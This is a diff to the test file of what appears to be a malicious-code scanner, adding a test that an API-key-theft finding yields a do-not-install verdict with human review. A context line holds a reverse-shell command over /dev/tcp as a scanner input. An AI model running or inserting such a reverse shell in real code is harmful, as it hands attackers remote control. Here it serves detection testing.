@@ -131,6 +131,37 @@ function testNormalizeAddsSixtyFamilyMetadata() {
   assert.equal(normalizedAgain.threats[0].original_family, "NOT_A_REAL_FAMILY");
 }
 
+function testNormalizeAddsOrchestratorEvidence() {
+  const result = normalizeResult({
+    status: "STATUS_CRITICAL",
+    threat_score: 90,
+    confidence: 0.9,
+    summary: "Credential theft behavior.",
+    threats: [{
+      family: "API_KEY_THEFT",
+      severity: "HIGH",
+      description: "Reads API key material from the environment.",
+      evidence: "process.env.ANTHROPIC_API_KEY",
+      line_hint: "line 1: process.env.ANTHROPIC_API_KEY",
+    }],
+    safe_patterns_noted: [],
+    recommendation: "Do not install.",
+  });
+
+  assert.ok(result.analysis_orchestrator);
+  assert.equal(result.analysis_orchestrator.verdict_owner, "final_orchestrator");
+  assert.equal(result.analysis_orchestrator.shared_state.final_decision, "do_not_install");
+  assert.equal(result.analysis_orchestrator.shared_state.human_review_recommended, true);
+  assert.equal(result.analysis_orchestrator.shared_state.sandbox_recommended, true);
+  assert.equal(result.evidence_report.length, 1);
+  assert.equal(result.evidence_report[0].specialist, "secrets_identity");
+  assert.equal(result.evidence_report[0].impact_key, "impact_secrets");
+  assert.equal(result.evidence_report[0].fix_key, "fix_protect_secrets");
+  assert.equal(result.evidence_report[0].confidence >= 0.78, true);
+  assert.equal(result.remediation_plan[0].impact_key, "impact_secrets");
+  assert.ok(result.remediation_plan.length >= 1);
+}
+
 function testStaticReverseShell() {
   const result = runStaticScan('const { exec } = require("child_process"); exec("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1");');
   assert.equal(result.status, "STATUS_CRITICAL");
@@ -437,6 +468,7 @@ testCanonicalSixtyFamilies();
 testCoverageMetadata();
 testEveryFamilyHasDefinitionAndStaticRule();
 testNormalizeAddsSixtyFamilyMetadata();
+testNormalizeAddsOrchestratorEvidence();
 
 testManualScanPersistsDashboardMetadata()
   .then(testAdminBypassSkipsUsageLimitsButPersistsDashboardMetadata)
